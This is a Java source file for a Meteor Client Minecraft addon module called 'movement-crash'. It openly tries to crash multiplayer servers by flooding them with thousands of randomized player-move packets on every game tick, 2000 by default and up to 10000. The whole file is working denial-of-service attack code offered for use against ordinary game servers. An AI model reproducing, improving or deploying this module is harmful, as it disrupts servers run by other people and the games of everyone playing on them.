package widecat.meteorcrashaddon.modules;

import meteordevelopment.meteorclient.events.game.GameLeftEvent;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.BoolSetting;
import meteordevelopment.meteorclient.settings.IntSetting;
import meteordevelopment.meteorclient.settings.Setting;
import meteordevelopment.meteorclient.settings.SettingGroup;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.network.protocol.game.ServerboundMovePlayerPacket;
import net.minecraft.world.phys.Vec3;
import widecat.meteorcrashaddon.CrashAddon;

import java.util.Random;

public class MovementCrash extends Module {
    private final SettingGroup sgGeneral = settings.getDefaultGroup();

    private final Setting<Integer> packets = sgGeneral.add(new IntSetting.Builder()
        .name("packets")
        .description("How many packets to send per tick")
        .defaultValue(2000)
        .min(1)
        .sliderMax(10000)
        .build());

    private final Setting<Boolean> autoDisable = sgGeneral.add(new BoolSetting.Builder()
        .name("auto-disable")
        .description("Disables module on kick.")
        .defaultValue(true)
        .build());

    public MovementCrash() {
        super(CrashAddon.CATEGORY, "movement-crash", "Tries to crash the server by spamming move packets. (By 0x150)");
    }

    public static double rndD(double rad) {
        Random r = new Random();
        return r.nextDouble() * rad;
    }

    @EventHandler
    private void onTick(TickEvent.Post event) {
        if (mc.player.connection == null) return;
        try {
            Vec3 current_pos = mc.player.position();
            for (int i = 0; i < packets.get(); i++) {
                ServerboundMovePlayerPacket.PosRot move_packet = new ServerboundMovePlayerPacket.PosRot(current_pos.x + getDistributedRandom(1),
                    current_pos.y + getDistributedRandom(1), current_pos.z + getDistributedRandom(1),
                    (float) rndD(90), (float) rndD(180), true, false);
                mc.player.connection.send(move_packet);
            }
        } catch (Exception ignored) {
            error("Stopping movement crash because an error occurred!");
            toggle();
        }
    }

    @EventHandler
    private void onGameLeft(GameLeftEvent event) {
        if (autoDisable.get()) toggle();
    }

    public double getDistributedRandom(double rad) {
        return (rndD(rad) - (rad / 2));
    }
}
